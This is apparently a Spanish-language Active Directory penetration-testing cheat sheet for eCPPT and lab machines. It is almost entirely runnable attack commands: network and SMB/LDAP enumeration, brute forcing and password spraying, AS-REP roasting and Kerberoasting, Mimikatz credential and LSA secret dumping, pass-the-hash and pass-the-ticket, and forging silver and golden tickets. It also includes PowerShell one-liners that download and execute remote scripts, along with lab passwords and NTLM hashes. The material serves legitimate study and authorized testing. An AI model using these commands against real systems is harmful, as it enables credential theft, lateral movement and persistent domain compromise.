
**[[SAUNA]]**
**[[FOREST]]**
**[[ACTIVE]]**
**[[BLACKFIELD]]**
**[[HEIST]]**
**[[SERVMON]]**
**[[WINDOWS POST-EXPLOITATION LAB]]**

## CHECKLIST EXPLOTACIÓN AD

- **ENUMERACIÓN DE MAQUINAS**
- **ENUMERACIÓN PUERTOS Y SERVICIOS**
- **CONSTRUIR MAPA CON MAQUINAS (HOSTS, DCs)**
- **ENUMERACIÓN POR SERVICIOS**
    - **LDAP**
    - **SHARES**
    - **USERS**
    - **HTTP**
        - [[UNION SELECT SQLI]]
        - [[ERROR BASED SQLI]]
        - [[REFLECTED XSS WORDPRESS RELEVANSSI PLUGIN]]
- **ENUMERACIÓN CMS**
- **FUERZA BRUTA**
    - **HYDRA**
    - **CRACKMAPEXEC**
- **TECNICAS AD**
    - [[PASSWORD SPRAYING]] - [[PASSWORD POLICIES ENUMERATION]]
    - [[AS-REP ROASTING]]
    - [[KERBEROASTING]]
    - [[SMB RELAY ATTACK]]
    - **PRIVESC**
        - **PROCESOS, PRIVILEGIOS POR USUARIO, REGISTROS**
        - [[POWERSHELL HISTORY]]
        - [[POWERUP]] **- Framework Powershell privesc**
        - [[PRIVESCCHECK]]
        - [[WINDOWS CREDENTIAL MANAGER]]
        - [[INSECURE SERVICE PERMISSIONS]]
        - [[REGISTRY AUTORUN]]
        - [[ACCESS TOKEN IMPERSONATION]]
        - [[JUICY POTATO]]
        - [[BYPASSING UAC - UACME]]
        - [[DLL HIJACKING]]
        - [[UNATTENDED INSTALLATION FILES]]
- **ENUMERACION DEL SISTEMA**
    - [[BLOODHOUND]]
    - [[POWERVIEW]]

## TECNICAS EXPLOTACIÓN AD

### SERVICE PORTS ENUMERATION
#### [[NMAP]]

**Enumeración de hosts dentro de la red**

```shell
nmap -sn 10.0.2.0/24
```

**Enumeración de puertos multiples IPs**

```shell
nmap -sS --min-rate 5000 -p- --open 10.0.2.5,6,7,8 -oN tcp_scan.txt
```

**Extracion de puertos con grep**

```shell
grep '^[0-9]' tcp_scan.txt | cut -d '/' -f1 | sort -u | xargs | tr ' ' ','
```

**Enumeracion de servicios**

```shell
nmap -p135,22,25,445 -sCV --open 10.0.2.5,6,7,8 -Pn -oN full_scan.txt
```

### WEB ENUMERATION

#### WORDPRESS WPSCAN

# enumeración usuarios, plugins vulnerables, temas
``` python
# enumeracion usuarios, plugins vulnerables, temas

wpscan --url http://example.com --enumerate u,p,t --api-token <API-TOKEN>

# ataque fuerza bruta a xlmrpc
wpscan --url http://example.com --passwords /path/to/passwords.txt --usernames admin --force
```
#### NIKTO

```python
nikto --url 10.10.10.100
```

#### SUBDOMAIN ENUMERATION
# gobuster

```python
gobuster vhost -u http://10.10.10.100 -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -t 20
```


# ffuf

```python
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u "http://machine.com" -H "HOST: FUZZ.machine.com" -c
```

#### DIRECTORY ENUMERATION
# gobuster

```python
gobuster dir -u http://10.10.10.100 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20
```


# ffuf

```python
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://machine.com" -H "HOST: machine.com/FUZZ" -c
```

#### [[BURPSUITE]]

### ENUMERATION AD

#### [[BLOODHOUND]]

#### [[POWERVIEW]]

#### LDAP ENUMERATION

# Enumeración como sesión nula

```python
ldapsearch -x -b "dc=domain,dc=local" -H ldap://10.10.10.100
```


# Filtrando por clase de objeto 

```python
ldapsearch -x -b "dc=domain,dc=local" -H ldap://10.10.10.100 -W "objectclass=account"
```

# windapsearch

```python
./windapsearch.py -d egotistical-bank.local --dc-ip 10.10.10.175 -U
```

# impacket tool GetADUsers

```python
GetADUsers.py egotistical-bank.local/ -dc-ip 10.10.10.175 -debug
```

# ldap domain dump authenticated

```python
ldapdomaindump ldap://10.10.11.35 -u 'cicada.htb\michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8'
```

#### SHARES ENUMERATION

**CrackMapExec**

```shell
# Sesion nula
crackmapexec smb 10.10.10.100 -u '' -p ''

# Sesion nula mostrando shares
crackmapexec smb 10.10.10.100 -u '' -p '' --shares
```

**smbclient**

```shell
# Realizamos la conexion como sesion nula
smbclient -L 10.10.10.100 -N
smbclient \\\\10.10.10.100\\Replication -U '' -N
```

**smbmap**

```shell
# Mostrar permisos share
smbmap -H 10.10.10.100

# Mostrar contenido con -r de la carpeta MyShare
smbmap -H 10.10.10.100 -r MyShare
```

**Download Content**

```shell
# Descargar todo el contenido de la carpeta
prompt off
recurse on
mget *

# Descargar contenido
smbmap -H 10.10.10.100 -download MyShare/myfile.txt
```

#### USERS ENUMERATION

**rpcclient - Port: 135**

```shell
# Enumeracion usuarios por defecto o sesion nula
rpcclient -U '' -N 10.10.10.100
rpcclient 10.10.10.100 -U 'guest'

# Realizar conexion
rpcclient 10.10.10.100 -U 'domain.local\SVC_TGS'

# Una vez conectados podemos hacer uso:
# Enumeracion de usuarios del sistema
enumdomusers
enumdomgroups
```

**enum4linux**

```shell
# Uso basico herramienta
enum4linux 10.10.10.100

# Output Formateado obteniendo usuarios con flag -U
enum4linux -U 10.10.10.100  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```

**CrackMapExec**

```shell
# Una vez tenemos credenciales validas realizar RID-BruteForcing
crackmapexec smb 10.10.10.100 -u hazard -p 'stealth1agent' --rid-brute

# -- Unauthenticated -- Obtener usuarios mediante flag --users 
crackmapexec smb 10.10.10.100 --users

# -- Authenticated (Valid Credentials) -- 
sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
```

**ldapsearch**

```shell
ldapsearch -h 10.10.10.100 -x -b "DC=DOMAIN,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
```

**windapsearch**

```shell
./windapsearch.py --dc-ip 10.10.10.100 -u "" -U
```

**kerbrute**

```shell
kerbrute userenum -d domain.local --dc 10.10.10.100 /opt/jsmith.txt 
```

### FUERZA BRUTA SERVICIOS/PROTOCOLOS

**HYDRA**

```shell
hydra -l administrator -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 10.2.16.158 smb2
```

### BREACHING AD

#### [[PASSWORD SPRAYING]]

##### [[PASSWORD POLICIES ENUMERATION]]

##### PASSWORD SPRAYING FROM WINDOWS

[](https://github.com/ant0dev/Methodology-eCPPT/blob/main/METODOLOGIA%20ATAQUE%20AD%20%26%20CERTIFICACION%20eCPPTv3.md#password-spraying-from-windows)

**Importar Modulo Powerview | Enumeracion de usuarios de forma Local**

```powershell
# Importamos el modulo
. .\PowerView.ps1

# Obtenemos todos los usuarios del sistema de forma local
Get-DomainUser | Select-Object -ExpandProperty cn | Out-File users.txt

# Tambien existe esta manera para enumerar los de /domain
net user /domain
```

**Realizar Ataque Password Spraying** **DomainPasswordSpray Module**

```powershell
# Importamos el modulo
. .\DomainPasswordSpray.ps1

# Ataque PasswordSpray (en este caso el diccionario de usuarios esta en el mismo directorio)
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
# Filtrando Solamente por positivos, no ponemos user list al ser local
Invoke-DomainPasswordSpray -Password 123456 -Verbose -OutFile spray_success -ErrorAction SilentlyContinue
```

---

##### PASSWORD SPRAYING FROM LINUX

[](https://github.com/ant0dev/Methodology-eCPPT/blob/main/METODOLOGIA%20ATAQUE%20AD%20%26%20CERTIFICACION%20eCPPTv3.md#password-spraying-from-linux)

**Bash One-Liner**

```shell
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

**Kerbrute**

```shell
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
```

**CrackMapExec Password Spraying**

```shell
# Password Spraying, lista de usuarios, contraseña encontrada o realizada
crackmapexec smb 10.10.10.100 -u users.txt -p 'GPPMyPasswordSecret202$'
# Filtrando por positivos
crackmapexec smb 10.10.10.100 -u users.txt -p 'GPPMyPasswordSecret202$' | grep +

# Validar Credenciales
sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
```

**Local Administrator Password Reuse** Si obtenemos acceso administrativo o de maximos privilegios y tenemos la contraseña en texto plano o el hash **NTLM** de la contraseña, podemos intentar utilizarlos en multiples hosts de la red. Por ejemplo si encontramos un administrador local con una contraseña como `$desktop%@admin123` podemos cambiar desktop por `server`, `$server%@admin123`.

```shell
# Local Admin Spraying (Podria darse positivo en varios DCs de la propia subred)
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```

### PRIVESC

[](https://github.com/ant0dev/Methodology-eCPPT/blob/main/METODOLOGIA%20ATAQUE%20AD%20%26%20CERTIFICACION%20eCPPTv3.md#privesc)

#### [[AS-REP ROASTING]]

[](https://github.com/ant0dev/Methodology-eCPPT/blob/main/METODOLOGIA%20ATAQUE%20AD%20%26%20CERTIFICACION%20eCPPTv3.md#as-rep-roasting)

**Importar Modulo Powerview**

```powershell
# Dar permisos de bypass
powershell -ep bypass

# Importamos el modulo
. .\PowerView.ps1
```

**Identificar usuarios con la opcion DONT_REQ_PREAUTH valida**

```powershell
Get-DomainUser | Where-Object { $_.UserAccountControl -like "*DONT_REQ_PREAUTH*" }
```

**Realizar Ataque As-Rep Roasting**

```powershell
# Herramienta Rubeus
.\Rubeus.exe asreproast /user:johnny /outfile:jonnyhash.txt

# Set Impacket
impacket-GetNPUsers -no-pass -usersfile user.txt domain.local/
```

**Password Cracking**

```powershell
.\john.exe .\johnhash.txt --format=krb5asrep -wordlist=.\10k-worst-pass.txt
```

#### [[KERBEROASTING]]

[](https://github.com/ant0dev/Methodology-eCPPT/blob/main/METODOLOGIA%20ATAQUE%20AD%20%26%20CERTIFICACION%20eCPPTv3.md#kerberoasting)

**Importar Modulo Powerview**

```powershell
# Permisos bypass powershell
powershell -ep bypass

# Importamos el moudulo
. .\PowerView.ps1
```

**Enumeración de SPNs**

```powershell
# Lista Todos los posibles usuario filtrando por los cuales tiene el SPN iniciado
Get-NetUser | Where-Object {$_.servicePrincipalName} | fl
setspn -T research -Q */*
```

**Mostrar todos los tickets de Kerberos en la sesión actual**

```powershell
klist
```

**Pedir TGS Ticket para SPN especifico usando Kerberos**

```powershell
# Agregamos el ensamblado System.IdentityModel
Add-Type -AssemblyName System.IdentityModel

# Crear un objeto de tipo KerberosRequestorSecurityToken
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList “ops/research.SECURITY.local:1434”
```

**Extraer los Kerberos Tickets**

```powershell
# Importar modulo Mimikatz
. .\Invoke-Mimikatz.ps1

# Enumerar todos los vales de Kerberos y exportarlos para su uso posterior
Invoke-Mimikatz -Command '"kerberos::list /export"'
```

**Descifrar la contraseña del ticket de TGS especifico con Tgsrepcrack**

```powershell
python.exe .\kerberoast-Python3\tgsrepcrack.py .\10k-worst-pass.txt .\1-40a10000-student@ops~research.SECURITY.local~1434-RESEARCH.SECURITY.LOCAL.kirbi
```

**Hashcat Descifrar Contraseña**

```shell
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt 
```

---

**Impacket ToolSet**

```powershell
impacket-GetUserSPNs domain.local/SVC_TGS

impacket-GetUserSPNs domain.local/SVC_TGS:GPPMyPasswordSecret202$ -request
```

### LATERAL MOVEMENT

[](https://github.com/ant0dev/Methodology-eCPPT/blob/main/METODOLOGIA%20ATAQUE%20AD%20%26%20CERTIFICACION%20eCPPTv3.md#lateral-movement)

#### [[PASS THE HASH]]

[](https://github.com/ant0dev/Methodology-eCPPT/blob/main/METODOLOGIA%20ATAQUE%20AD%20%26%20CERTIFICACION%20eCPPTv3.md#pass-the-hash)

#### [[PASS THE TICKET]]

[](https://github.com/ant0dev/Methodology-eCPPT/blob/main/METODOLOGIA%20ATAQUE%20AD%20%26%20CERTIFICACION%20eCPPTv3.md#pass-the-ticket)

**Importar Modulo Powerview**

```powershell
# Dar permisos de bypass
powershell -ep bypass

# Importamos el modulo
. .\PowerView.ps1
```

**Comprobar los permisos de administración del usuario actual en otros dominios**

```powershell
Find-LocalAdminAccess
```

**Abrir una Powershell Session en el sistema remoto al cual tenemos acceso como Admin**

```powershell
# Abrir sesion
EnterPSSession seclogs.research.SECURITY.local

# Analizar permisos (debemos de tener todos los permisos)
whoami
whoami /priv
```

**Pasamos herramientas Mimikatz de un sistema a otro mediante un servidor de subida de archivos**

```powershell
cd \
iex (New-Object Net.WebClient).DownloadString('http://10.0.5.101/Invoke-Mimikatz.ps1')
```

**Extracción de todos los tickets de Kerberos vinculados a nuestra sesión**

```powershell
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
```

**Enumeramos los tickets de Kerberos**

```powershell
ls | select name
```

**Realizamos ataque PTT**

```powershell
Invoke-Mimikatz -Command ‘"kerberos::ptt [0;2c1c7]-2-0-40e10000-maintainer@krbtgt-RESEARCH.SECURITY.LOCAL.kirbi"’
```

**Mostar el ticket inyectado en la sesion**

```powershell
klist
```

**Mostar contenido via smb desde la propia PSSesion**

```powershell
ls \\prod.research.SECURITY.local\c$
```

### PERSISTENCE

[](https://github.com/ant0dev/Methodology-eCPPT/blob/main/METODOLOGIA%20ATAQUE%20AD%20%26%20CERTIFICACION%20eCPPTv3.md#persistence)

#### [[SILVER TICKET]]

[](https://github.com/ant0dev/Methodology-eCPPT/blob/main/METODOLOGIA%20ATAQUE%20AD%20%26%20CERTIFICACION%20eCPPTv3.md#silver-ticket)

**Importar Modulo Powerview | Nombre y SID de dominio | FQDN del DC**

```powershell
# Permisos bypass powershell
powershell -ep bypass

# Importamos el moudulo
. .\PowerView.ps1

# Obtener el nombre de dominio y el FQDN del DC
Get-Domain

# Obtener SID de nuestro dominio
Get-DomainSID
```

**Comprobar los permisos de administración del usuario actual en otros dominios**

```powershell
Find-LocalAdminAccess
```

**Abrir una Powershell Session en el sistema remoto al cual tenemos acceso como Admin**

```powershell
# Abrir sesion
EnterPSSession seclogs.research.SECURITY.local

# Analizar permisos (debemos de tener todos los permisos)
whoami
whoami /priv
```

**Pasamos herramientas Mimikatz/TokenManipulation de un sistema a otro mediante un servidor de subida de archivos**

```powershell
cd \
iex (New-Object Net.WebClient).DownloadString('http://10.0.5.101/Invoke-Mimikatz.ps1')
iex (New-Object Net.WebClient).DownloadString('http://10.0.5.101/Invoke-TokenManipulation.ps1')
```

**Enumerar todos los posibles tokens**

```powershell
Invoke-TokenManipulation –Enumerate
```

**Mostrar todos los hashes NTLM de los usuarios que han iniciado sesion**

```powershell
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords"'
```

**Realizar un ataque PtH en una powershell con permisos de Administrador**

```powershell
cd C:\Tools

# Dar permisos de bypass
powershell -ep bypass

# Importar modulo
. .\Invoke-Mimikatz.ps1

# Ataque PtH
Invoke-Mimikatz -Command '"sekurlsa::pth /user:administrator /domain:research.security.local /ntlm:84398159ce4d01cfe10cf34d5dae3909 /run:powershell.exe"'
```

**En la consola dada, realizamos una busqueda para encontrar la cuenta del sistema que tiene la contraseña de la maquina victima (FQDN)**

```powershell
cd C:\Tools

# Dar permisos de bypass
powershell -ep bypass

# Importar modulo
. .\Invoke-Mimikatz.ps1

# Mostrar la cuenta del sistema victima
Invoke-Mimikatz -Command '"lsadump::lsa /inject"' -Computername prod.research.SECURITY.local
```

**Generar el Silver Ticket en una Powershell Standard**

```powershell
cd C:\Tools

# Dar permisos de bypass
powershell -ep bypass

# Importar modulo
. .\Invoke-Mimikatz.ps1

# Generar Silver Ticket
Invoke-Mimikatz -Command '"kerberos::golden /domain:research.SECURITY.local /sid:S-1-5-21-1693200156-3137632808-1858025440 /target:prod.research.SECURITY.local /service:CIFS /rc4:d5f92467d4425e5f34fb55893e8a7768 /user:administrator /ptt"'
```

**Mostar el ticket inyectado en la sesion**

```powershell
klist
```

**Mostar contenido via smb**

```powershell
ls \\prod.research.SECURITY.local\c$
```

#### [[GOLDEN TICKET]]

[](https://github.com/ant0dev/Methodology-eCPPT/blob/main/METODOLOGIA%20ATAQUE%20AD%20%26%20CERTIFICACION%20eCPPTv3.md#golden-ticket)

**Importar el modulo Powerview**

```powershell
# Dar permisos bypass
powershell -ep bypass

# Importar modulo Powerview
. .\PowerView.ps1
```

**Extraer hash NTLM y SID del usuario Administrador**

```powershell
# Importar modulo Mimikatz
. .\Invoke-Mimikatz.ps1

# Extraer hash NTLM
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'
```

**Realizar ataque PtH**

```powershell
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:research.security.local /ntlm:84398159ce4d01cfe10cf34d5dae3909"'
```

**Desde el cmd del PtH, recuperamos el hash de la cuenta de servicio KRBTGT**

```powershell
# Convertimos la cmd a powershell
powershell

# Directorio de herramientas
cd C:\Tools

# Dar permisos bypass
powershell -ep bypass

# Importar modulo Mimikatz
. .\Invoke-Mimikatz.ps1

# "lsadump::lsa" vuelca los secretos de LSA, y "/patch" hace que Mimikatz parchee el proceso para permitir la exportación de secretos.
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName prod.research.security.local
```

**Generar Golden Ticket**

```powershell
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:research.security.local /sid:S-1-5-21-1693200156-3137632808-1858025440 /krbtgt:0e3cab3ba66afddb664025d96a8dc4d2 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
```

**Mostar el ticket inyectado en la sesion**

```powershell
klist
```

**Mostar contenido via smb**

```powershell
dir \\prod.research.SECURITY.local\c$
```